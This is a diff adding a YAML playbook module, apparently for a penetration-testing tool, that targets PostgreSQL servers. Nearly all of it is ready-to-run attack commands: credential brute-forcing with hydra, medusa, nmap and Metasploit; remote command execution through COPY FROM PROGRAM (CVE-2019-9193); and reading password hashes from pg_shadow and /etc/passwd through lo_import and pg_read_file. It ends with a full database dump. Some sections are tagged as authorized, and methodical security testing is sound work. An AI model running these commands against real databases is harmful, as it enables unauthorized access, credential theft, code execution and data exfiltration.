@@ -1,0 +1,91 @@
+module: postgres
+name: PostgreSQL (5432)
+inputs: [USERS, PASS, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / version
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+      - id: connect
+        text: Connect (default db/user)
+        commands: |
+          psql -h $IP -p $PORT -U postgres
+          psql "postgresql://$USER:$PASS@$IP:$PORT/postgres"
+
+  - id: fingerprint
+    name: Fingerprinting & Enumeration
+    steps:
+      - id: enum
+        text: Databases / roles / current privileges
+        commands: |
+          # \l   (databases)   \du  (roles)   \dt  (tables)
+          # SELECT current_user; SELECT version();
+          # SELECT rolname,rolsuper,rolcreaterole FROM pg_roles;
+      - id: superuser
+        text: Check for superuser (needed for RCE / file access)
+        commands: |
+          # SELECT usename FROM pg_user WHERE usesuper IS TRUE;
+          # SHOW is_superuser;
+      - id: creds_in_db
+        text: Hunt stored credentials / passwords
+        manual: true
+        commands: |
+          # SELECT usename,passwd FROM pg_shadow;   -- superuser only
+
+  - id: vuln
+    name: Vulnerability Identification
+    steps:
+      - id: cve_map
+        text: Version to CVE mapping
+        commands: |
+          searchsploit postgresql
+      - id: rce_cve
+        text: CVE-2019-9193 COPY-to-program RCE (9.3-11)
+        manual: true
+        commands: |
+          # see exploit step below (COPY FROM PROGRAM)
+
+  - id: creds
+    name: Default & Weak Credentials
+    authorized: true
+    steps:
+      - id: brute
+        text: Credential brute-force
+        commands: |
+          hydra -L $USERLIST -P $PASSLIST postgres://$IP -s $PORT
+          medusa -h $IP -U $USERLIST -P $PASSLIST -M postgres -n $PORT
+          nmap -p$PORT --script=pgsql-brute $IP
+      - id: brute_msf
+        text: Brute-force / login via Metasploit
+        commands: |
+          msfconsole -qx "use auxiliary/scanner/postgres/postgres_login; set RHOSTS $IP; set RPORT $PORT; set USER_FILE $USERLIST; set PASS_FILE $PASSLIST; run; exit"
+
+  - id: exploit
+    name: RCE, File Access & Post-Access
+    authorized: true
+    steps:
+      - id: copy_rce
+        text: Command execution via COPY FROM PROGRAM (superuser)
+        commands: |
+          # CREATE TABLE cmd(o text); COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd;
+          msfconsole -qx "use exploit/multi/postgres/postgres_copy_from_program_cmd_exec; set RHOSTS $IP; set RPORT $PORT; set USERNAME $USER; set PASSWORD $PASS; run; exit"
+      - id: large_object
+        text: Read/write files via large objects (superuser)
+        manual: true
+        commands: |
+          # SELECT lo_import('/etc/passwd'); SELECT lo_get(<oid>);
+      - id: file_read
+        text: Read files via pg_read_file
+        manual: true
+        commands: |
+          # SELECT pg_read_file('/etc/passwd', 0, 1000000);
+      - id: dump
+        text: Dump database
+        manual: true
+        commands: |
+          pg_dump "postgresql://$USER:$PASS@$IP:$PORT/<db>" > $OUT/pg.sql
